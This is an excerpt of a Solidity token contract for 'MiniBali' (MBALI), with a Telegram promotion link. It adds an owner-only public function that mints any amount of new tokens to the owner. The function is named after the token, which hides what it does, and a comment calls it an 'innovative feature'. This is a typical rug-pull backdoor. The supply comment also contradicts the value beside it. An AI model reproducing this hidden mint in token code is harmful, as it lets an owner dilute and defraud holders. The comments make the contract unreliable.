...
//
// $minibali proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/minibali
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function MiniBali(uint256 amount) public onlyOwner {
    _MiniBali(msg.sender, amount);
    }
    ...
    function _MiniBali(address account, uint256 amount) internal virtual {
...
contract MiniBali is ERC20 {

    uint tokenTotalSupply = 1000000000000; // 100 Million Token Supply

    constructor() public ERC20("MiniBali", "MBALI") {
        _MiniBali(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}